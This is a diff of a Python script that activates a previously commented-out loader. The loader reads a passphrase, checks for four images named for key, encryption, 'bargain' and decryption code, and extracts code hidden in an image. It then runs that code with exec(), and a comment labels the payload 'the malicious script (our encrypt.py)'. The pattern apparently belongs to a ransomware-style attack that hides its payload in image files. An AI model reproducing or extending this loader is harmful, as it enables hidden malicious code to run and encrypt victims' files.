@@ -1,5 +1,5 @@
-'''#import os
-#from extract import extract_file
+import os
+from extract import extract_file
 
 
 def main():
@@ -7,7 +7,6 @@ def main():
     with open("passphrase.txt", "r") as file:
         lines = file.readlines()
         passphrase = lines[0].strip("\n")
-    #code_to_encrypt_files: str = extract_file(image_containing_encryption_code, passphrase)
 
     # Represents the name of the two images to be scanned for
     with open ("images.txt", "r") as file:
@@ -26,9 +25,11 @@ def main():
         if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found:
             code_to_encrypt: str = extract_file(image_containing_encryption_code, passphrase)
             # Runs the malicious script (our "encrypt.py")
-            exec(code_to_encrypt)
+            exec("import encrypt")
+            exec(f"{code_to_encrypt}")
+
+
         else:
-            ready_to_attack: bool = False
             for file in [key_found, encrypt_code_found, bargain_code_found, decrypt_code_found]:
                 if file is False:
                     raise FileNotFoundError(f"The image name/path {file} doesn't exist in the current directory."
@@ -44,4 +45,3 @@ def main():
 
 
 main()
-'''
